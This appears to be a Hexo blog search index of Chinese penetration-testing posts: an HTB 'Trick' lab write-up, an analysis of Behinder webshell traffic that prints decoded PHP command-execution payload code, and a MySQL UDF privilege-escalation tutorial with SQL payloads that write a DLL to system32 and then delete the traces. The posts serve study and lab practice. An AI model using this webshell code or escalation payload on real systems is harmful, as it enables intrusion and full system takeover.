<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>HTB-tirck</title>
      <link href="/2022/10/14/trick/"/>
      <url>/2022/10/14/trick/</url>
      
        <content type="html"><![CDATA[<h1 id="HTB-trick靶机"><a href="#HTB-trick靶机" class="headerlink" title="HTB trick靶机"></a>HTB trick靶机</h1><h2 id="打点"><a href="#打点" class="headerlink" title="打点"></a>打点</h2><p>拿到靶机首先nmap跑一波信息收集，可以看到这台靶机比以往的靶机多开了个53（DNS）端口，这题的突破口也就在53端口。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Bebop)-[~]</span><br><span class="line">└─# nmap -sT -sC -T4 10.10.11.166</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-09 09:33 EDT</span><br><span class="line">Warning: 10.10.11.166 giving up on port because retransmission cap hit (6).</span><br><span class="line">Nmap scan report for 10.10.11.166 (10.10.11.166)</span><br><span class="line">Host is up (0.58s latency).</span><br><span class="line">Not shown: 955 closed tcp ports (conn-refused), 41 filtered tcp ports (no-response)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)</span><br><span class="line">|   256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)</span><br><span class="line">|_  256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)</span><br><span class="line">25/tcp open  smtp</span><br><span class="line">|_smtp-commands: debian.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING</span><br><span class="line">53/tcp open  domain</span><br><span class="line">| dns-nsid: </span><br><span class="line">|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian</span><br><span class="line">80/tcp open  http</span><br><span class="line">|_http-title: Coming Soon - Start Bootstrap Theme</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 261.26 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>先直接浏览器访问80端口，看到如下界面，整个页面都是静态的，到处点几下，没有任何收获</p><p><img src="/../images/image-20221009214523452.png" alt="image-20221009214523452"></p><p>因为目标开启了DNS服务，我们用nslookup收集一下他的域名信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Bebop)-[~]</span><br><span class="line">└─# nslookup</span><br><span class="line">&gt; server 10.10.11.166</span><br><span class="line">Default server: 10.10.11.166</span><br><span class="line">Address: 10.10.11.166#53</span><br><span class="line">&gt; 10.10.11.166</span><br><span class="line">166.11.10.10.in-addr.arpa       name = trick.htb.</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Bebop)-[~]</span><br><span class="line">└─# dig axfr @10.10.11.166 trick.htb</span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.18.4-2-Debian &lt;&lt;&gt;&gt; axfr @10.10.11.166 trick.htb</span><br><span class="line">; (1 server found)</span><br><span class="line">;; global options: +cmd</span><br><span class="line">trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800</span><br><span class="line">trick.htb.              604800  IN      NS      trick.htb.</span><br><span class="line">trick.htb.              604800  IN      A       127.0.0.1</span><br><span class="line">trick.htb.              604800  IN      AAAA    ::1</span><br><span class="line">preprod-payroll.trick.htb. 604800 IN    CNAME   trick.htb.</span><br><span class="line">trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800</span><br><span class="line">;; Query time: 912 msec</span><br><span class="line">;; SERVER: 10.10.11.166#53(10.10.11.166) (TCP)</span><br><span class="line">;; WHEN: Sun Oct 09 22:43:51 EDT 2022</span><br><span class="line">;; XFR size: 6 records (messages 1, bytes 231)</span><br></pre></td></tr></table></figure><p>利用文件包含字典遍历读取passwd文件，发现目标存在名为michael的可登录用户</p><p><img src="/../images/image-20221017195802258.png" alt="image-20221017195802258"></p><p>我们再试着读取目标用户的ssh私钥</p><p><img src="/../images/image-20221017195902933.png" alt="image-20221017195902933"></p><p>尝试连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Bebop)-[~]</span><br><span class="line">└─# ssh michael@10.10.11.166 -i id_rsa</span><br><span class="line">Linux trick 4.19.0-20-amd64 #1 SMP Debian 4.19.235-1 (2022-03-17) x86_64</span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms for each program are described in the</span><br><span class="line">individual files in /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Mon Oct 17 10:12:52 2022 from 10.10.14.98</span><br><span class="line">michael@trick:~$ </span><br></pre></td></tr></table></figure><p>成功登上目标机器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">michael@trick:~$ ls</span><br><span class="line">Desktop    Downloads  Pictures  Templates  Videos</span><br><span class="line">Documents  Music      Public    user.txt</span><br><span class="line">michael@trick:~$ cat user.txt</span><br><span class="line">721d604007b62320b2c857f3ec3f9260</span><br></pre></td></tr></table></figure><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>我们上传pspy可以发现一个定时任务文件，但是它每一分钟会对自身进行一次恢复，所以手一定要快。因为网络环境实在太卡了，所以就没有后续了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> HTB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>冰蝎流量分析</title>
      <link href="/2022/10/14/%E5%86%B0%E8%9D%8E3.0%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
      <url>/2022/10/14/%E5%86%B0%E8%9D%8E3.0%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="虚拟终端"><a href="#虚拟终端" class="headerlink" title="虚拟终端"></a>虚拟终端</h1><p>与受害机连接后，在冰蝎虚拟终端输入命令 ‘whoami’ ，在PHPSTORM中获取初步解密后的数据</p><p><img src="/../images/image-20221015170550892.png" alt="image-20221015170550892"></p><p><img src="/../images/image-20221015170626770.png" alt="image-20221015170626770"></p><p>将编码部分代码解密后，简单调整得到如下代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">assert|<span class="keyword">eval</span>(</span><br><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//调整编码</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getSafeStr</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$s1</span> = <span class="title function_ invoke__">iconv</span>(<span class="string">&#x27;utf-8&#x27;</span>,<span class="string">&#x27;gbk//IGNORE&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">    <span class="variable">$s0</span> = <span class="title function_ invoke__">iconv</span>(<span class="string">&#x27;gbk&#x27;</span>,<span class="string">&#x27;utf-8//IGNORE&#x27;</span>,<span class="variable">$s1</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$s0</span> == <span class="variable">$str</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$s0</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">iconv</span>(<span class="string">&#x27;gbk&#x27;</span>,<span class="string">&#x27;utf-8//IGNORE&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"><span class="variable">$cmd</span>,<span class="variable">$path</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    @<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line">    @<span class="title function_ invoke__">ignore_user_abort</span>(<span class="number">1</span>);</span><br><span class="line">    @<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;max_execution_time&#x27;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$result</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="comment">//获取disfunc的内容</span></span><br><span class="line">    <span class="variable">$PadtJn</span> = @<span class="title function_ invoke__">ini_get</span>(<span class="string">&#x27;disable_functions&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$PadtJn</span>)) &#123;</span><br><span class="line">        <span class="variable">$PadtJn</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[, ]+/&#x27;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="variable">$PadtJn</span>);</span><br><span class="line">        <span class="variable">$PadtJn</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$PadtJn</span>);</span><br><span class="line">        <span class="variable">$PadtJn</span> = <span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;trim&#x27;</span>, <span class="variable">$PadtJn</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$PadtJn</span> = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="comment">//如果目标是windows则构造相应的命令</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">FALSE</span> !== <span class="title function_ invoke__">strpos</span>(<span class="title function_ invoke__">strtolower</span>(PHP_OS), <span class="string">&#x27;win&#x27;</span>)) &#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$c</span> . <span class="string">&quot; 2&gt;&amp;1\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$JueQDBH</span> = <span class="string">&#x27;is_callable&#x27;</span>;</span><br><span class="line">    <span class="variable">$Bvce</span> = <span class="string">&#x27;in_array&#x27;</span>;</span><br><span class="line">    <span class="comment">//判断可用函数并执行命令</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$JueQDBH</span>(<span class="string">&#x27;system&#x27;</span>) <span class="keyword">and</span> ! <span class="variable">$Bvce</span>(<span class="string">&#x27;system&#x27;</span>, <span class="variable">$PadtJn</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$kWJW</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">        <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$JueQDBH</span>(<span class="string">&#x27;proc_open&#x27;</span>) <span class="keyword">and</span> ! <span class="variable">$Bvce</span>(<span class="string">&#x27;proc_open&#x27;</span>, <span class="variable">$PadtJn</span>)) &#123;</span><br><span class="line">        <span class="variable">$handle</span> = <span class="title function_ invoke__">proc_open</span>(<span class="variable">$c</span>, <span class="keyword">array</span>(</span><br><span class="line">            <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;pipe&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;r&#x27;</span></span><br><span class="line">            ),</span><br><span class="line">            <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;pipe&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;w&#x27;</span></span><br><span class="line">            ),</span><br><span class="line">            <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;pipe&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;w&#x27;</span></span><br><span class="line">            )</span><br><span class="line">        ), <span class="variable">$pipes</span>);</span><br><span class="line">        <span class="variable">$kWJW</span> = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">while</span> (! <span class="title function_ invoke__">feof</span>(<span class="variable">$pipes</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">            <span class="variable">$kWJW</span> .= <span class="title function_ invoke__">fread</span>(<span class="variable">$pipes</span>[<span class="number">1</span>], <span class="number">1024</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        @<span class="title function_ invoke__">proc_close</span>(<span class="variable">$handle</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$JueQDBH</span>(<span class="string">&#x27;passthru&#x27;</span>) <span class="keyword">and</span> ! <span class="variable">$Bvce</span>(<span class="string">&#x27;passthru&#x27;</span>, <span class="variable">$PadtJn</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">        <span class="title function_ invoke__">passthru</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$kWJW</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">        <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$JueQDBH</span>(<span class="string">&#x27;shell_exec&#x27;</span>) <span class="keyword">and</span> ! <span class="variable">$Bvce</span>(<span class="string">&#x27;shell_exec&#x27;</span>, <span class="variable">$PadtJn</span>)) &#123;</span><br><span class="line">        <span class="variable">$kWJW</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$JueQDBH</span>(<span class="string">&#x27;exec&#x27;</span>) <span class="keyword">and</span> ! <span class="variable">$Bvce</span>(<span class="string">&#x27;exec&#x27;</span>, <span class="variable">$PadtJn</span>)) &#123;</span><br><span class="line">        <span class="variable">$kWJW</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="title function_ invoke__">exec</span>(<span class="variable">$c</span>, <span class="variable">$kWJW</span>);</span><br><span class="line">        <span class="variable">$kWJW</span> = <span class="title function_ invoke__">join</span>(<span class="title function_ invoke__">chr</span>(<span class="number">10</span>), <span class="variable">$kWJW</span>) . <span class="title function_ invoke__">chr</span>(<span class="number">10</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$JueQDBH</span>(<span class="string">&#x27;exec&#x27;</span>) <span class="keyword">and</span> ! <span class="variable">$Bvce</span>(<span class="string">&#x27;popen&#x27;</span>, <span class="variable">$PadtJn</span>)) &#123;</span><br><span class="line">        <span class="variable">$fp</span> = <span class="title function_ invoke__">popen</span>(<span class="variable">$c</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">        <span class="variable">$kWJW</span> = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_resource</span>(<span class="variable">$fp</span>)) &#123;</span><br><span class="line">            <span class="keyword">while</span> (! <span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) &#123;</span><br><span class="line">                <span class="variable">$kWJW</span> .= <span class="title function_ invoke__">fread</span>(<span class="variable">$fp</span>, <span class="number">1024</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        @<span class="title function_ invoke__">pclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//如果以上函数都不可用，则返回无函数可用的信息</span></span><br><span class="line">        <span class="variable">$kWJW</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$result</span>[<span class="string">&quot;status&quot;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&quot;fail&quot;</span>);</span><br><span class="line">        <span class="variable">$result</span>[<span class="string">&quot;msg&quot;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&quot;none of proc_open/passthru/shell_exec/exec/exec is available&quot;</span>);</span><br><span class="line">        <span class="variable">$key</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">encrypt</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$result</span>), <span class="variable">$key</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//如果成功执行，则把执行后的信息返回</span></span><br><span class="line">    <span class="variable">$result</span>[<span class="string">&quot;status&quot;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">    <span class="variable">$result</span>[<span class="string">&quot;msg&quot;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">getSafeStr</span>(<span class="variable">$kWJW</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">encrypt</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$result</span>),  <span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//对返回的信息加密</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params"><span class="variable">$data</span>,<span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;openssl&#x27;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$data</span>[<span class="variable">$i</span>] = <span class="variable">$data</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">openssl_encrypt</span>(<span class="variable">$data</span>, <span class="string">&quot;AES128&quot;</span>, <span class="variable">$key</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span>=<span class="string">&#x27;cd /d &quot;C:\phppro\phpstudy_pro\WWW\&quot;&amp;whoami&#x27;</span>;</span><br><span class="line"><span class="variable">$path</span>=<span class="string">&quot;C:/phppro/phpstudy_pro/WWW/&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">main</span>(<span class="variable">$cmd</span>,<span class="variable">$path</span>);</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>通过简单的分析可以知道，首先我们会获取目标disable_function里的内容，将里面的内容存储到数组里。接着判断当前环境可用的命令执行函数有哪些，并判断函数是否在disable_function中，如果可用且未被禁用则执行我们的命令。如果未能执行则返回失败信息，将信息加密并返回，如果能成功执行则把执行结果与成功信息加密并返回。</p>]]></content>
      
      
      
        <tags>
            
            <tag> [object Object] </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>UDF提权</title>
      <link href="/2022/10/12/udf%E6%8F%90%E6%9D%83/"/>
      <url>/2022/10/12/udf%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>前段时间沉迷于打靶，但是每次拿到webshell之后思路就断了，也让我发现自己对提权知识点掌握的并不是很牢固，拿不了root、system怎么办😢 ,练呗！</p><h1 id="UDF"><a href="#UDF" class="headerlink" title="UDF"></a>UDF</h1><p>UDF（User defined function），即用户自定义函数，是MYSQL的一个扩展接口，用户可以使用该接口来创建函数。</p><h1 id="利用方法和条件"><a href="#利用方法和条件" class="headerlink" title="利用方法和条件"></a>利用方法和条件</h1><p>利用方法</p><blockquote><p>在数据库中创建一张表，在表中插入udf.dll的数据，再从表中把数据导出到相应文件夹，MySQL版本小于5.1时，对应文件夹为C:\windows\system32；反之则需要放在MySQL安装目录下的MySQL\</p><p>lib\plugin 下（一般plugin目录都不存在，所以需要自己手动创建，<a href="#one">后面会说</a>）</p></blockquote><p>利用条件（其实还是比较苛刻的）</p><blockquote><p>数据库用户权限为root</p><p>有写入删除权限</p></blockquote><h1 id="战斗开始"><a href="#战斗开始" class="headerlink" title="战斗开始"></a>战斗开始</h1><p>先把<span id="one">payload</span>贴出来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">select version()//查看数据库版本</span><br><span class="line"></span><br><span class="line">select current_user()//查看当前数据库用户</span><br><span class="line"></span><br><span class="line">show global variables like &#x27;secure_file_priv&#x27;//查看是否写入权限</span><br><span class="line"></span><br><span class="line">select @@basedir//查看安装目录</span><br><span class="line"></span><br><span class="line">show variables like &quot;%plugin%&quot;//查看plugin目录位置</span><br><span class="line"></span><br><span class="line">select &#x27;#anything&#x27; into outfile &#x27;C:/phpstudy/mysql/lib::$INDEX_ALLOCATION&#x27;//创建目录（plugin目录同理）,但是这里我从来就没成功过</span><br><span class="line"></span><br><span class="line">create table udf_ed(vital longblob);//创建表</span><br><span class="line"></span><br><span class="line">insert into ed_udf values(load_file(&#x27;C:/Inetpub/wwwroot/udf_ed.dll&#x27;));//写入数据</span><br><span class="line"></span><br><span class="line">select vital from ed_udf into dumpfile &#x27;C:/WINDOWS/system32/udf_ed.dll&#x27;;//导出dll文件</span><br><span class="line"></span><br><span class="line">create function sys_eval returns string soname &quot;udf_ed.dll&quot;//创建函数</span><br><span class="line"></span><br><span class="line">select * from func;//查询函数是否创建成功</span><br><span class="line"></span><br><span class="line">select sys_eval(&#x27;ipconfig&#x27;);//调用命令</span><br><span class="line"></span><br><span class="line">drop function sys_eval;//删除痕迹</span><br></pre></td></tr></table></figure><p>通过文件上传拿到webshell后发现是个低权限，cmd命令都执行不了</p><p><img src="/../images/image-20221012111438103.png" alt="image-20221012111438103"></p><p>顺便翻翻发现了网站的配置文件，获得数据库密码，这也告诉我们信息收集无论在何时何刻都很重要</p><p><img src="/../images/image-20221012111613062.png" alt="image-20221012111613062"></p><p>连接数据库后第一件事还是信息收集，这里我们查看数据库的版本，发现是5.0的（所以后面要上传的目录就是C:\windows\system32）</p><p><img src="/../images/image-20221012180105347.png" alt="image-20221012180105347"></p><p>接下来查看当前用户，是个root权限 👍</p><p><img src="/../images/image-20221012180127633.png" alt="image-20221012180127633"></p><p>再看看有没有对我们导入导出的权限做限制，发现并没有。至此UDF提权的条件完全满足，开始干正事。</p><p><img src="/../images/image-20221012180240045.png" alt="image-20221012180240045"></p><p>查看目标机器的操作位数，因为后面要上传的dll文件要与机器的操作位数相同</p><p><img src="/../images/image-20221013094352205.png" alt="image-20221013094352205"></p><p>把我们的dll文件随便上传到一个能上传的路径，这里我上传到了C:&#x2F;Inetpub&#x2F;cms&#x2F;目录下</p><p><img src="/../images/image-20221012180738448.png" alt="image-20221012180738448"></p><p>再次进入数据库，创建一张表，表名随意，字段随意，数据类型要为longblob（二进制大对象，是一个可以存储二进制文件的容器）</p><p><img src="/../images/image-20221012180434905.png" alt="image-20221012180434905"></p><p>通过load_file读取我们上传的dll文件，把内容插入表中</p><p><img src="/../images/image-20221012180936689.png" alt="image-20221012180936689"></p><p>这里查询表内的内容，通过dumpfile以二进制的形式导出到c:&#x2F;windows&#x2F;system32&#x2F;目录下，命名为udf_test.dll</p><p><img src="/../images/image-20221012181236595.png" alt="image-20221012181236595"></p><p>通过刚刚从表内导出的dll文件创建函数</p><p><img src="/../images/image-20221012181351806.png" alt="image-20221012181351806"></p><p>已经创建成功了</p><p><img src="/../images/image-20221012181503590.png" alt="image-20221012181503590"></p><p>至高无上的system权限，自此就可以进行愉快的后渗透了😋</p><p><img src="/../images/image-20221012181535070.png" alt="image-20221012181535070"></p><p><img src="/../images/image-20221012200747527.png" alt="image-20221012200747527"></p><p><img src="/../images/image-20221012200812304.png" alt="image-20221012200812304"></p><p><img src="/../images/image-20221012200906543.png" alt="image-20221012200906543"></p><p><img src="/../images/image-20221012200927278.png" alt="image-20221012200927278"></p><p>删除函数</p><p><img src="/../images/image-20221012201845133.png" alt="image-20221012201845133"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 提权 </tag>
            
            <tag> MYSQL </tag>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从mysql数据库开始学习sql注入</title>
